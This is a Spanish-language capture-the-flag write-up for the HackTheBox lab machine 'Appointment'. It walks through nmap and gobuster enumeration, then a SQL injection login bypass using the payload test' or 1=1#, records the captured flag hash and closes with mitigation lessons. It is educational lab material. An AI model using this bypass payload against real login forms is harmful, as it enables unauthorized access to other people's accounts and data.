# 🎯 Appointment — HackTheBox (Starting Point)

## Información General

| Campo | Detalle |
|-------|---------|
| **Plataforma** | HackTheBox — Starting Point Tier 1 |
| **Dificultad** | Muy Fácil |
| **OS** | Linux |
| **Tags** | `sql-injection` `web` `authentication-bypass` `owasp` |

---

## Objetivo

Explotar una vulnerabilidad de SQL Injection en un formulario de login para autenticarse como administrador sin conocer la contraseña, y capturar la flag del sistema.

---

## Herramientas Utilizadas

- `nmap` — enumeración de puertos y servicios
- `gobuster` — enumeración de directorios web
- Navegador web — interacción con el formulario de login

---

## Conceptos Clave

- **SQL** (Structured Query Language): lenguaje estándar para gestionar bases de datos relacionales.
- **SQL Injection**: vulnerabilidad clasificada como **A03:2021-Injection** en el OWASP Top 10 2021. Ocurre cuando la entrada del usuario se incorpora directamente en una consulta SQL sin sanitización.
- **PII** (Personally Identifiable Information): datos que pueden identificar a una persona. Una SQL Injection puede exponer esta información.

---

## Metodología

### 1. Reconocimiento — Enumeración de puertos

```bash
nmap -A --top-ports 1000 10.129.192.236 -T4 -vv
```

**Resultado relevante:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

El servidor expone únicamente el puerto **80** con un servidor web Apache 2.4.38 sobre Debian.

---

### 2. Enumeración Web — Descubrimiento de directorios

Se utiliza `gobuster` en modo `dir` para enumerar directorios en el servidor:

```bash
gobuster dir -u http://10.129.192.236 -w /usr/share/wordlists/...
```

> **Nota:** El switch `dir` indica a Gobuster que enumere directorios, no subdominios.

La aplicación presenta un formulario de login. El código HTTP **404** indica recurso no encontrado; el puerto estándar de HTTPS es el **443**.

---

### 3. Explotación — SQL Injection en Login

El formulario de login es vulnerable a SQL Injection. En MySQL, el carácter `#` comenta el resto de una línea, lo que permite manipular la lógica de la consulta.

**Payload utilizado:**

```
Usuario:   admin
Contraseña: test' or 1=1#
```

**Lógica del ataque:**

La consulta original sería algo así:
```sql
SELECT * FROM users WHERE username='admin' AND password='...'
```

Con el payload, se convierte en:
```sql
SELECT * FROM users WHERE username='admin' AND password='test' or 1=1#'
```

La condición `1=1` siempre es verdadera, por lo que el login procede exitosamente sin necesidad de contraseña válida.

---

### 4. Captura de Flag

Tras el login exitoso, la página devuelve la palabra **"Congratulations"** y presenta la flag.

---

## Flags

| Tipo | Hash |
|------|------|
| **Root Flag** | `e3d0796d002a446c0e622226f42e9672` |

---

## Lecciones Aprendidas

1. **Nunca confiar en la entrada del usuario.** Todo input debe sanitizarse antes de incluirse en una consulta SQL.
2. **Usar prepared statements / consultas parametrizadas** es la mitigación más efectiva contra SQL Injection.
3. El carácter `#` en MySQL (equivalente a `--` en otros motores) permite comentar porciones de una consulta, siendo un vector clásico de bypass de autenticación.
4. SQL Injection sigue siendo una de las vulnerabilidades más comunes y peligrosas (OWASP Top 10 desde 2017).
